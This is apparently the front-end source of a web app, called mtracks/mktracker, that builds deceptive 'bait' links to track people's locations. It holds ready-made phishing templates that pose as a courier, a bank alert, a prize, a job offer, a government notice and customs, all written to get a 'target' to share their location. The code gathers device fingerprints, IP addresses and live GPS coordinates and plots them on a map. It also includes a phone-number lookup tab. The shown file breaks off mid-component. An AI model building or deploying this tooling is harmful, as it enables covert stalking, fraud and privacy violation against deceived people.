'use client';

import { useEffect, useState, useCallback, useRef } from 'react';
import io from 'socket.io-client';
import dynamic from 'next/dynamic';
import {
  IconRadar,
  IconPhone,
  IconTarget,
  IconFingerprint,
  IconPackage,
  IconShieldAlert,
  IconAward,
  IconBriefcase,
  IconGovernment,
  IconPlane,
  IconPizza,
  IconEdit,
  IconSearch,
  IconCopy,
  IconTrash,
  IconPlus,
  IconExternalLink,
  IconCpu,
  IconMap
} from '../components/Icons';

// Helper to resolve template category to its premium vector SVG icon
const getTemplateIcon = (id, color = 'currentColor', size = 20) => {
  switch (id) {
    case 'delivery': return <IconPackage size={size} color={color} />;
    case 'bank':     return <IconShieldAlert size={size} color={color} />;
    case 'prize':    return <IconAward size={size} color={color} />;
    case 'job':      return <IconBriefcase size={size} color={color} />;
    case 'gov':      return <IconGovernment size={size} color={color} />;
    case 'customs':  return <IconPlane size={size} color={color} />;
    case 'food':     return <IconPizza size={size} color={color} />;
    default:         return <IconEdit size={size} color={color} />;
  }
};

const LeafletMap = dynamic(() => import('./LeafletMap'), {
  ssr: false,
  loading: () => (
    <div style={{ height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'var(--bg)', color: 'var(--t3)', fontSize: 13 }}>
      Loading OpenStreetMap…
    </div>
  )
});

const MAP_STYLES = [
  { "elementType": "geometry", "stylers": [{ "color": "#18181b" }] },
  { "elementType": "labels.text.stroke", "stylers": [{ "color": "#18181b" }] },
  { "elementType": "labels.text.fill", "stylers": [{ "color": "#71717a" }] },
  {
    "featureType": "administrative.locality",
    "elementType": "labels.text.fill",
    "stylers": [{ "color": "#a1a1aa" }]
  },
  {
    "featureType": "poi",
    "elementType": "labels.text.fill",
    "stylers": [{ "color": "#71717a" }]
  },
  {
    "featureType": "poi.park",
    "elementType": "geometry",
    "stylers": [{ "color": "#27272a" }]
  },
  {
    "featureType": "poi.park",
    "elementType": "labels.text.fill",
    "stylers": [{ "color": "#52525b" }]
  },
  {
    "featureType": "road",
    "elementType": "geometry",
    "stylers": [{ "color": "#27272a" }]
  },
  {
    "featureType": "road",
    "elementType": "geometry.stroke",
    "stylers": [{ "color": "#1f1f23" }]
  },
  {
    "featureType": "road.highway",
    "elementType": "geometry",
    "stylers": [{ "color": "#3f3f46" }]
  },
  {
    "featureType": "road.highway",
    "elementType": "geometry.stroke",
    "stylers": [{ "color": "#27272a" }]
  },
  {
    "featureType": "road.highway",
    "elementType": "labels.text.fill",
    "stylers": [{ "color": "#a1a1aa" }]
  },
  {
    "featureType": "water",
    "elementType": "geometry",
    "stylers": [{ "color": "#09090b" }]
  },
  {
    "featureType": "water",
    "elementType": "labels.text.fill",
    "stylers": [{ "color": "#3f3f46" }]
  }
];

const mapOptions = {
  styles: MAP_STYLES,
  disableDefaultUI: true,
  zoomControl: true,
  mapTypeControl: false,
  scaleControl: true,
  streetViewControl: false,
  rotateControl: false,
  fullscreenControl: false,
};

/* ─── Helpers ──────────────────────────────────────────────────────────────── */
function generateId() {
  const a = new Uint8Array(8);
  if (typeof window !== 'undefined') crypto.getRandomValues(a);
  return Array.from(a).map(b => b.toString(16).padStart(2,'0')).join('');
}

const getDeviceInfo = () => {
  const ua = navigator.userAgent, pl = navigator.platform;
  let device = 'Unknown', browser = 'Unknown';
  if (/iPhone/.test(ua)) device = 'iPhone';
  else if (/iPad/.test(ua)) device = 'iPad';
  else if (/Android/.test(ua)) device = 'Android';
  else if (/Mac/.test(pl)) device = 'Mac';
  else if (/Win/.test(pl)) device = 'Windows';
  else if (/Linux/.test(pl)) device = 'Linux';
  if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
  else if (/Firefox/.test(ua)) browser = 'Firefox';
  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
  else if (/Edg/.test(ua)) browser = 'Edge';
  return {
    userAgent: ua, platform: pl, language: navigator.language,
    screenSize: `${window.screen.width}×${window.screen.height}`,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    deviceType: device, browser,
    cores: navigator.hardwareConcurrency || '?',
    memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '?',
  };
};

/* ─── Bait templates ───────────────────────────────────────────────────────── */
const TEMPLATES = [
  { id: 'delivery', label: 'Delivery',       title: 'Your package is arriving today', body: 'Your parcel has been dispatched. Please confirm your location so our driver can find you.', cta: 'Confirm Location' },
  { id: 'bank',     label: 'Bank Alert',     title: 'Unusual sign-in detected',        body: 'We noticed a login attempt from an unrecognised device. Please verify your location to secure your account.', cta: 'Verify My Identity' },
  { id: 'prize',    label: 'Prize',          title: "You've been selected",            body: 'You are one of 5 people chosen for our exclusive reward. Share your location to claim it before it expires.', cta: 'Claim My Reward' },
  { id: 'job',      label: 'Job Offer',      title: 'Interview confirmation',          body: 'You have been shortlisted for the role you applied for. Our recruiter needs to confirm your area.', cta: 'Confirm Location' },
  { id: 'gov',      label: 'Government',     title: 'Official notice — action required', body: 'A document addressed to you is ready for collection at your nearest government office. Confirm your location to proceed.', cta: 'View My Notice' },
  { id: 'customs',  label: 'Customs',        title: 'Parcel held at customs',          body: 'An international package addressed to you requires location verification before we can release it.', cta: 'Release Parcel' },
  { id: 'food',     label: 'Food Delivery',  title: 'Your order is 2 minutes away',   body: 'Your rider is nearby and needs your exact location. Tap below to share so they can find you.', cta: 'Share Location' },
  { id: 'custom',   label: 'Custom',         title: '', body: '', cta: '' },
];

const THEME_MAP = {
  delivery: { color: '#3b82f6', bg: '#eff6ff', border: '#bfdbfe', text: '#1d4ed8' },
  bank:     { color: '#eab308', bg: '#fefce8', border: '#fef08a', text: '#854d0e' },
  prize:    { color: '#d97706', bg: '#fffbeb', border: '#fde68a', text: '#78350f' },
  job:      { color: '#10b981', bg: '#ecfdf5', border: '#a7f3d0', text: '#065f46' },
  gov:      { color: '#6366f1', bg: '#eef2ff', border: '#c7d2fe', text: '#3730a3' },
  customs:  { color: '#8b5cf6', bg: '#f5f3ff', border: '#ddd6fe', text: '#4c1d95' },
  food:     { color: '#ef4444', bg: '#fef2f2', border: '#fecaca', text: '#991b1b' },
  custom:   { color: '#6366f1', bg: '#eef2ff', border: '#c7d2fe', text: '#3730a3' },
};

/* ─── Small shared components ──────────────────────────────────────────────── */
function Divider() {
  return <div style={{ borderTop: '1px solid var(--line)', margin: '0' }} />;
}

function SectionLabel({ children }) {
  return (
    <div style={{ padding: '10px 16px 6px', fontSize: 10, fontWeight: 700, letterSpacing: '.08em', textTransform: 'uppercase', color: 'var(--t3)' }}>
      {children}
    </div>
  );
}

function DataRow({ label, value, mono = false }) {
  if (!value && value !== 0) return null;
  return (
    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'baseline', padding: '5px 16px', gap: 16 }}>
      <span style={{ fontSize: 12, color: 'var(--t3)', flexShrink: 0 }}>{label}</span>
      <span style={{ fontSize: 12, color: mono ? 'var(--accent)' : 'var(--t1)', fontFamily: mono ? 'var(--mono)' : 'inherit', textAlign: 'right', wordBreak: 'break-all' }}>
        {value}
      </span>
    </div>
  );
}

function RiskBar({ score }) {
  const label = score < 25 ? 'LOW' : score < 55 ? 'MEDIUM' : 'HIGH';
  const color = score < 25 ? 'var(--green)' : score < 55 ? 'var(--yellow)' : 'var(--red)';
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
      <div style={{ flex: 1, height: 4, background: 'var(--bg-3)', borderRadius: 2, overflow: 'hidden' }}>
        <div style={{ width: `${score}%`, height: '100%', background: color, borderRadius: 2, transition: 'width .6s ease' }} />
      </div>
      <span style={{ fontSize: 11, fontWeight: 700, color, minWidth: 46 }}>{label} {score}%</span>
    </div>
  );
}

/* ─── PHONE INTEL TAB ──────────────────────────────────────────────────────── */
function PhoneIntelTab() {
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState(null);
  const [error, setError] = useState('');
  const [copied, setCopied] = useState(false);

  const lookup = async () => {
    if (!phone.trim()) return;
    setLoading(true); setError(''); setResult(null);
    try {
      const res  = await fetch(`/api/phone?number=${encodeURIComponent(phone.trim())}`);
      const data = await res.json();
      if (data.error === 'no_keys') setError('no_keys');
      else if (data.error) setError(data.message || 'Lookup failed');
      else setResult(data);
    } catch { setError('Network error. Check connection.'); }
    finally { setLoading(false); }
  };

  const copyReport = async () => {
    if (!result) return;
    await navigator.clipboard.writeText(
      `Number: ${result.number}\nValid: ${result.valid}\nCountry: ${result.country}\nCarrier: ${result.carrier}\nType: ${result.lineType}\nRisk: ${result.riskScore}% (${result.riskLevel})`
    );
    setCopied(true); setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div style={{ maxWidth: 620, margin: '0 auto', padding: '28px 24px' }}>
      {/* Header */}
      <div style={{ marginBottom: 24 }}>
        <h2 style={{ fontSize: 16, fontWeight: 700, color: 'var(--t1)', marginBottom: 4 }}>Phone Number Intelligence</h2>
        <p style={{ fontSize: 12, color: 'var(--t3)' }}>Carrier · Line type · Country · Risk score</p>
      </div>

      {/* Search */}
      <div style={{ display: 'flex', gap: 8, marginBottom: 24 }}>
        <input
          className="input mono" value={phone}
          onChange={e => setPhone(e.target.value)}
          onKeyDown={e => e.key === 'Enter' && lookup()}
          placeholder="+44 7700 900123"
          style={{ flex: 1 }}
        />
        <button className="btn btn-primary" onClick={lookup} disabled={loading || !phone.trim()}>
          {loading ? (
            <span style={{ width: 14, height: 14, border: '2px solid rgba(255,255,255,.3)', borderTopColor: '#fff', borderRadius: '50%', display: 'inline-block', animation: 'spin .7s linear infinite' }} />
          ) : 'Search'}
        </button>
      </div>

      {/* No-keys notice */}
      {error === 'no_keys' && (
        <div className="card" style={{ padding: 20, marginBottom: 20 }}>
          <div style={{ fontSize: 13, fontWeight: 600, color: 'var(--yellow)', marginBottom: 10 }}>API key required</div>
          <p style={{ fontSize: 12, color: 'var(--t2)', marginBottom: 12, lineHeight: 1.6 }}>
            Add a free key to <code className="mono" style={{ background: 'var(--bg-3)', padding: '2px 6px', borderRadius: 4, color: 'var(--accent)', fontSize: 11 }}>mtracks/.env.local</code>
          </p>
          <pre className="mono" style={{ background: 'var(--bg)', border: '1px solid var(--line)', padding: '12px 14px', borderRadius: 7, fontSize: 11, color: 'var(--t2)', lineHeight: 1.8, overflowX: 'auto' }}>
{`# numverify.com — free, 250/month
NUMVERIFY_API_KEY=your_key

# OR abstractapi.com — free, 250/month  
ABSTRACT_API_KEY=your_key`}
          </pre>
        </div>
      )}

      {/* Error */}
      {error && error !== 'no_keys' && (
        <div style={{ padding: '10px 14px', background: 'rgba(239,68,68,.08)', border: '1px solid rgba(239,68,68,.2)', borderRadius: 7, fontSize: 12, color: 'var(--red)', marginBottom: 16 }}>
          {error}
        </div>
      )}

      {/* Result */}
      {result && (
        <div className="card fade-up" style={{ overflow: 'hidden' }}>
          {/* Top strip */}
          <div style={{ padding: '16px 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', borderBottom: '1px solid var(--line)' }}>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 4 }}>
                <span style={{ fontSize: 22 }}>{result.flag}</span>
                <span className="mono" style={{ fontSize: 17, fontWeight: 700, color: 'var(--t1)' }}>{result.intlFormat || result.number}</span>
                <span style={{
                  padding: '2px 7px', borderRadius: 4, fontSize: 10, fontWeight: 700,
                  background: result.valid ? 'var(--green-soft)' : 'rgba(239,68,68,.1)',
                  color: result.valid ? 'var(--green)' : 'var(--red)',
                  border: `1px solid ${result.valid ? 'rgba(34,197,94,.2)' : 'rgba(239,68,68,.2)'}`,
                }}>
                  {result.valid ? 'VALID' : 'INVALID'}
                </span>
              </div>
              <div style={{ fontSize: 11, color: 'var(--t3)' }}>via {result.source} · {new Date().toLocaleTimeString()}</div>
            </div>
            <button className="btn btn-ghost" style={{ padding: '6px 12px', fontSize: 12 }} onClick={copyReport}>
              {copied ? '✓ Copied' : 'Copy'}
            </button>
          </div>

          {/* Data rows */}
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr' }}>
            <div style={{ borderRight: '1px solid var(--line)', paddingTop: 8, paddingBottom: 12 }}>
              <SectionLabel>Number Info</SectionLabel>
              <DataRow label="Country"    value={`${result.flag} ${result.country}`} />
              <DataRow label="Dial code"  value={result.dialCode} mono />
              <DataRow label="Carrier"    value={result.carrier} />
              <DataRow label="Line type"  value={result.lineType} />
              <DataRow label="Region"     value={result.location} />
              <DataRow label="Local"      value={result.localFormat} mono />
            </div>
            <div style={{ paddingTop: 8, paddingBottom: 12 }}>
              <SectionLabel>Risk Analysis</SectionLabel>
              <div style={{ padding: '4px 16px 12px' }}>
                <div style={{ fontSize: 11, color: 'var(--t3)', marginBottom: 8 }}>Spam score</div>
                <RiskBar score={result.riskScore} />
              </div>
              {result.possibleApps?.length > 0 && (
                <div style={{ padding: '0 16px' }}>
                  <div style={{ fontSize: 11, color: 'var(--t3)', marginBottom: 8 }}>Possible apps</div>
                  <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6 }}>
                    {result.possibleApps.map(app => (
                      <span key={app.name} style={{
                        padding: '3.5px 10px', borderRadius: 5, fontSize: 11, fontWeight: 600,
                        background: app.likely ? 'var(--green-soft)' : 'var(--bg-3)',
                        color: app.likely ? 'var(--green)' : 'var(--t3)',
                        border: `1px solid ${app.likely ? 'rgba(34,197,94,.2)' : 'var(--line)'}`,
                      }}>{app.name}</span>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Raw */}
          <div style={{ borderTop: '1px solid var(--line)' }}>
            <details>
              <summary style={{ padding: '10px 16px', fontSize: 11, color: 'var(--t3)', cursor: 'pointer', userSelect: 'none' }}>Raw JSON</summary>
              <pre className="mono" style={{ padding: '0 16px 14px', fontSize: 10.5, color: 'var(--t2)', lineHeight: 1.6, overflowX: 'auto', background: 'transparent' }}>
                {JSON.stringify(result, null, 2)}
              </pre>
            </details>
          </div>
        </div>
      )}

      {/* Tips */}
      {!result && !error && (
        <div className="card" style={{ padding: 16 }}>
          <div style={{ fontSize: 12, color: 'var(--t3)', lineHeight: 1.8 }}>
            <div style={{ fontWeight: 600, color: 'var(--t2)', marginBottom: 6 }}>Tips</div>
            <div>Always include country code: <span className="mono" style={{ color: 'var(--accent)', fontSize: 11 }}>+44 7700 900123</span></div>
            <div>Works on mobile, landline, and VoIP numbers</div>
            <div>Risk score is derived from carrier signals and line type</div>
            <div style={{ marginTop: 8, color: 'var(--t3)' }}>Free keys at numverify.com · abstractapi.com</div>
          </div>
        </div>
      )}
    </div>
  );
}

/* ─── BAIT BUILDER TAB ─────────────────────────────────────────────────────── */
function BaitBuilderTab({ trackerId }) {
  const [tpl, setTpl]             = useState(TEMPLATES[0]);
  const [customTitle, setCustomTitle] = useState('');
  const [customBody,  setCustomBody]  = useState('');
  const [customCta,   setCustomCta]   = useState('');
  const [idMode, setIdMode]       = useState('auto');
  const [customId, setCustomId]   = useState('');
  const [link, setLink]           = useState('');
  const [copied, setCopied]       = useState(false);

  const isCustom = tpl.id === 'custom';
  const title = isCustom ? customTitle : tpl.title;
  const body  = isCustom ? customBody  : tpl.body;
  const cta   = isCustom ? customCta   : tpl.cta;
  const theme = THEME_MAP[tpl.id] || THEME_MAP.custom;
  const ready = title && body && cta;

  const generate = () => {
    if (!ready) return;
    const payload = btoa(encodeURIComponent(JSON.stringify({ title, body, cta, icon: tpl.id, theme: tpl.id })));
    const id = idMode === 'custom' && customId.trim() ? customId.trim() : trackerId;
    setLink(`${window.location.origin}/track?id=${id}&msg=${payload}`);
  };

  const copyLink = async () => {
    await navigator.clipboard.writeText(link);
    setCopied(true); setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div style={{ display: 'grid', gridTemplateColumns: '420px 1fr', height: '100%', overflow: 'hidden' }}>
      {/* Left: builder */}
      <div style={{ borderRight: '1px solid var(--line)', overflowY: 'auto', padding: '24px 20px' }}>
        <div style={{ marginBottom: 20 }}>
          <h2 style={{ fontSize: 16, fontWeight: 700, color: 'var(--t1)', marginBottom: 4 }}>Bait Message Builder</h2>
          <p style={{ fontSize: 12, color: 'var(--t3)' }}>Choose what your target sees when they open the link</p>
        </div>

        {/* Template picker */}
        <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: '.06em', textTransform: 'uppercase', color: 'var(--t3)', marginBottom: 10 }}>Template</div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 6, marginBottom: 20 }}>
          {TEMPLATES.map(t => (
            <button key={t.id} onClick={() => setTpl(t)} style={{
              padding: '9px 6px', borderRadius: 7, cursor: 'pointer',
              background: tpl.id === t.id ? 'var(--accent-soft)' : 'var(--bg-2)',
              border: `1px solid ${tpl.id === t.id ? 'var(--accent)' : 'var(--line)'}`,
              color: tpl.id === t.id ? 'var(--accent)' : 'var(--t3)',
              fontSize: 11, fontWeight: 500, transition: 'all .1s',
              display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 6,
            }}>
              {getTemplateIcon(t.id, tpl.id === t.id ? 'var(--accent)' : 'var(--t2)', 18)}
              <span>{t.label}</span>
            </button>
          ))}
        </div>

        {/* Custom fields */}
        {isCustom && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 12, marginBottom: 20 }}>
            {[
              { label: 'Headline', val: customTitle, set: setCustomTitle, placeholder: 'What grabs their attention?' },
              { label: 'Body text', val: customBody,  set: setCustomBody,  placeholder: 'Explain why they need to act…', area: true },
              { label: 'Button',   val: customCta,   set: setCustomCta,   placeholder: 'Confirm Location…' },
            ].map(f => (
              <div key={f.label}>
                <div style={{ fontSize: 11, color: 'var(--t3)', marginBottom: 5 }}>{f.label}</div>
                {f.area
                  ? <textarea value={f.val} onChange={e => f.set(e.target.value)} placeholder={f.placeholder} rows={3}
                      className="input" style={{ resize: 'vertical', fontFamily: 'inherit', lineHeight: 1.5 }} />
                  : <input value={f.val} onChange={e => f.set(e.target.value)} placeholder={f.placeholder} className="input" />
                }
              </div>
            ))}
          </div>
        )}

        {/* Tracker ID */}
        <div style={{ marginBottom: 20 }}>
          <div style={{ fontSize: 11, color: 'var(--t3)', marginBottom: 8 }}>Tracker ID</div>
          <div style={{ display: 'flex', gap: 6, marginBottom: 10 }}>
            {['auto', 'custom'].map(m => (
              <button key={m} onClick={() => setIdMode(m)} style={{
                padding: '5px 12px', borderRadius: 6, fontSize: 11, cursor: 'pointer', fontWeight: 500,
                background: idMode === m ? 'var(--accent-soft)' : 'var(--bg-2)',
                border: `1px solid ${idMode === m ? 'var(--accent)' : 'var(--line)'}`,
                color: idMode === m ? 'var(--accent)' : 'var(--t3)',
              }}>{m === 'auto' ? 'Use my ID' : 'Custom'}</button>
            ))}
          </div>
          {idMode === 'auto'
            ? <div className="mono" style={{ fontSize: 11, color: 'var(--t3)' }}>{trackerId}</div>
            : <input value={customId} onChange={e => setCustomId(e.target.value)}
                placeholder="enter-custom-id" className="input mono" style={{ fontSize: 12 }} />
          }
        </div>

        {/* Generate */}
        <button className="btn btn-primary" onClick={generate} disabled={!ready}
          style={{ width: '100%', justifyContent: 'center', padding: '10px' }}>
          Generate Link
        </button>

        {/* Output */}
        {link && (
          <div style={{ marginTop: 16, padding: 14, background: 'var(--bg-2)', border: '1px solid var(--line)', borderRadius: 8 }}>
            <div style={{ fontSize: 11, color: 'var(--t3)', marginBottom: 6 }}>Tracking link</div>
            <div className="mono" style={{ fontSize: 11, color: 'var(--t2)', wordBreak: 'break-all', lineHeight: 1.6, marginBottom: 10 }}>{link}</div>
            <div style={{ display: 'flex', gap: 8 }}>
              <button className="btn btn-ghost" onClick={copyLink} style={{ flex: 1, justifyContent: 'center', fontSize: 12 }}>
                {copied ? '✓ Copied' : 'Copy link'}
              </button>
              <a href={link} target="_blank" rel="noreferrer"
                style={{ flex: 1, textAlign: 'center', padding: '8px', background: 'var(--bg-3)', border: '1px solid var(--line)', borderRadius: 7, fontSize: 12, color: 'var(--t2)', textDecoration: 'none', fontWeight: 600 }}>
                Preview
              </a>
            </div>
          </div>
        )}
      </div>

      {/* Right: preview */}
      <div style={{ overflowY: 'auto', background: 'var(--bg)', display: 'flex', flexDirection: 'column' }}>
        <div style={{ padding: '16px 20px 12px', borderBottom: '1px solid var(--line)' }}>
          <span style={{ fontSize: 11, fontWeight: 700, letterSpacing: '.06em', textTransform: 'uppercase', color: 'var(--t3)' }}>
            Preview — what target sees
          </span>
        </div>
        {/* Browser chrome */}
        <div style={{ background: '#f1f5f9', borderBottom: '1px solid #e2e8f0', padding: '7px 14px', display: 'flex', alignItems: 'center', gap: 8 }}>
          <div style={{ display: 'flex', gap: 5 }}>
            {['#fc5c65','#fed330','#26de81'].map(c => (
              <div key={c} style={{ width: 9, height: 9, borderRadius: '50%', background: c }} />
            ))}
          </div>
          <div style={{ flex: 1, background: '#e2e8f0', borderRadius: 4, padding: '3px 10px', fontSize: 10, color: '#64748b', fontFamily: 'monospace' }}>
            {typeof window !== 'undefined' ? window.location.origin : 'https://mktracker.app'}/track?id=…
          </div>
        </div>
        {/* Preview content */}
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 32, background: '#f8fafc' }}>
          <div style={{
            background: 'white', borderRadius: 18,
            boxShadow: '0 4px 20px rgba(0,0,0,.08), 0 1px 3px rgba(0,0,0,.06)',
            padding: '32px 28px', textAlign: 'center', maxWidth: 320, width: '100%',
          }}>
            {/* Icon */}
            <div style={{
              width: 68, height: 68, borderRadius: 16, margin: '0 auto 20px',
              background: theme.bg, border: `1px solid ${theme.border}`,
              display: 'flex', alignItems: 'center', justifyContent: 'center',
            }}>
              {getTemplateIcon(tpl.id, theme.color, 28)}
            </div>

            <h2 style={{ fontSize: 18, fontWeight: 700, color: '#111827', marginBottom: 10, lineHeight: 1.3 }}>
              {title || 'Your headline goes here'}
            </h2>
            <p style={{ fontSize: 13, color: '#6b7280', lineHeight: 1.65, marginBottom: 22 }}>
              {body || 'Your body message will appear here. Make it convincing.'}
            </p>

            {/* Bounce dots */}
            <div style={{ display: 'flex', justifyContent: 'center', gap: 7, marginBottom: 18 }}>
              {[0,1,2].map(i => (
                <div key={i} style={{
                  width: 8, height: 8, borderRadius: '50%', background: theme.color,
                  animation: `bounce-3 1.4s ${i * 0.15}s infinite ease-in-out`,
                }} />
              ))}
            </div>

            <div style={{
              padding: '11px 16px', borderRadius: 9,
              background: theme.bg, border: `1px solid ${theme.border}`,
              fontSize: 13, fontWeight: 600, color: theme.text,
            }}>
              {cta || 'Confirm Location'}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

/* ─── LIVE TRACKERS TAB ────────────────────────────────────────────────────── */
function LiveTab({ trackers, activeId, setActiveId, myId, removeTracker, getLink }) {
  const getName = (id, t) => id === myId ? 'My Device' : t.alias || t.platform || `Device ${id.slice(0,6)}`;
  const active = trackers[activeId];

  const [infoWindowId, setInfoWindowId] = useState(null);

  return (
    <div style={{ display: 'flex', flex: 1, overflow: 'hidden' }}>
      {/* Sidebar */}
      <div style={{ width: 260, flexShrink: 0, borderRight: '1px solid var(--line)', display: 'flex', flexDirection: 'column', overflow: 'hidden', background: 'var(--bg-1)' }}>
        <div style={{ padding: '12px 16px', borderBottom: '1px solid var(--line)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span style={{ fontSize: 11, fontWeight: 700, letterSpacing: '.06em', textTransform: 'uppercase', color: 'var(--t3)' }}>
            Devices <span style={{ color: 'var(--accent)' }}>{Object.keys(trackers).length}</span>
          </span>
          <button className="btn btn-primary" style={{ padding: '4px 10px', fontSize: 11 }} onClick={getLink}>
            + Link
          </button>
        </div>
        <div style={{ flex: 1, overflowY: 'auto', padding: '8px' }}>
          {Object.keys(trackers).length === 0 ? (
            <div style={{ padding: '48px 16px', textAlign: 'center', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 14 }}>
              <div className="pulse-indicator" style={{
                width: 44, height: 44, borderRadius: '50%',
                background: 'rgba(99, 102, 241, 0.06)',
                border: '1px solid rgba(99, 102, 241, 0.15)',
                display: 'flex', alignItems: 'center', justifyContent: 'center'
              }}>
                <IconRadar size={20} color="var(--accent)" />
              </div>
              <div style={{ fontSize: 12, color: 'var(--t3)', lineHeight: 1.6 }}>No active telemetry.<br />Share a link to track.</div>
            </div>
          ) : (
            Object.entries(trackers).map(([id, t]) => (
              <div key={id} onClick={() => setActiveId(id)}
                style={{
                  padding: '10px 12px', borderRadius: 7, marginBottom: 3, cursor: 'pointer',
                  background: activeId === id ? 'var(--accent-soft)' : 'transparent',
                  border: `1px solid ${activeId === id ? 'rgba(99,102,241,.3)' : 'transparent'}`,
                  transition: 'all .1s',
                }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 2 }}>
                      <span style={{ width: 6, height: 6, borderRadius: '50%', background: 'var(--green)', flexShrink: 0, display: 'inline-block' }} />
                      <span style={{ fontSize: 12, fontWeight: 600, color: 'var(--t1)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                        {getName(id, t)}
                      </span>
                    </div>
                    {t.deviceInfo?.deviceType && (
                      <div style={{ fontSize: 11, color: 'var(--t3)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', paddingLeft: 12 }}>
                        {t.deviceInfo.deviceType} · {t.deviceInfo?.browser || '?'}
                      </div>
                    )}
                    {t.ipAddress && (
                      <div className="mono" style={{ fontSize: 10, color: 'var(--t3)', paddingLeft: 12, marginTop: 2 }}>{t.ipAddress}</div>
                    )}
                  </div>
                  {id !== myId && (
                    <button onClick={e => { e.stopPropagation(); removeTracker(id); }}
                      style={{ background: 'none', border: 'none', color: 'var(--t3)', cursor: 'pointer', fontSize: 14, padding: '0 2px', lineHeight: 1 }}>
                      ×
                    </button>
                  )}
                </div>
                {t.info?.accuracy && (
                  <div style={{ fontSize: 10, color: 'var(--t3)', marginTop: 4, paddingLeft: 12 }}>
                    ±{t.info.accuracy.toFixed(0)}m · {t.lastUpdate ? new Date(t.lastUpdate).toLocaleTimeString() : 'now'}
                  </div>
                )}
              </div>
            ))
          )}
        </div>
      </div>

      {/* Map + info strip */}
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
        {/* Map */}
        <div style={{ flex: 1, position: 'relative' }}>
          {/* Tactical HUD display overlay for target GPS coordinates */}
          {active?.coords && (
            <div style={{
              position: 'absolute',
              top: 16,
              left: 16,
              zIndex: 1000,
              background: 'rgba(20, 20, 22, 0.85)',
              backdropFilter: 'blur(12px)',
              border: '1px solid var(--line-bright)',
              borderRadius: 10,
              padding: '12px 16px',
              boxShadow: '0 8px 32px rgba(0,0,0,0.5)',
              minWidth: 220,
              display: 'flex',
              flexDirection: 'column',
              gap: 8,
            }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--line)', paddingBottom: 6 }}>
                <span style={{ fontSize: 10, fontWeight: 700, color: 'var(--t3)', letterSpacing: '.06em', textTransform: 'uppercase' }}>
                  GPS TELEMETRY
                </span>
                <span style={{ width: 6, height: 6, borderRadius: '50%', background: 'var(--green)', display: 'inline-block' }} className="pulse-indicator" />
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 11 }}>
                  <span style={{ color: 'var(--t3)' }}>LATITUDE</span>
                  <span className="mono" style={{ color: 'var(--accent)', fontWeight: 600 }}>{active.coords.lat.toFixed(6)}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 11 }}>
                  <span style={{ color: 'var(--t3)' }}>LONGITUDE</span>
                  <span className="mono" style={{ color: 'var(--accent)', fontWeight: 600 }}>{active.coords.lng.toFixed(6)}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 11 }}>
                  <span style={{ color: 'var(--t3)' }}>ACCURACY</span>
                  <span className="mono" style={{ color: 'var(--t1)' }}>±{active.info?.accuracy ? `${active.info.accuracy.toFixed(0)}m` : '?' }</span>
                </div>
              </div>
              <div style={{ display: 'flex', gap: 6, marginTop: 4 }}>
                <button 
                  onClick={async () => {
                    await navigator.clipboard.writeText(`${active.coords.lat}, ${active.coords.lng}`);
                    alert('Coordinates copied!');
                  }}
                  className="btn btn-ghost" 
                  style={{ flex: 1, padding: '4px 8px', fontSize: 10, justifyContent: 'center' }}
                >
                  Copy Coords
                </button>
                <a 
                  href={`https://www.google.com/maps/search/?api=1&query=${active.coords.lat},${active.coords.lng}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="btn btn-ghost"
                  style={{
                    flex: 1,
                    padding: '4px 8px',
                    fontSize: 10,
                    color: 'var(--accent)',
                    borderColor: 'rgba(99, 102, 241, 0.3)',
                    textDecoration: 'none',
                    display: 'inline-flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    gap: 4
                  }}
                >
                  <IconExternalLink size={10} color="var(--accent)" />
                  <span>Open GMap</span>
                </a>
              </div>
            </div>
          )}

          {active?.coords ? (
            <LeafletMap
              center={active.coords}
              zoom={15}
              trackers={trackers}
              activeId={activeId}
              setActiveId={setActiveId}
              setInfoWindowId={setInfoWindowId}
              infoWindowId={infoWindowId}
              getName={getName}
            />
          ) : (
            <div style={{ height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 16, background: '#0e0e10' }}>
              <div className="pulse-indicator" style={{
                width: 56, height: 56, borderRadius: '50%',
                background: 'rgba(99, 102, 241, 0.05)',
                border: '1px solid rgba(99, 102, 241, 0.2)',
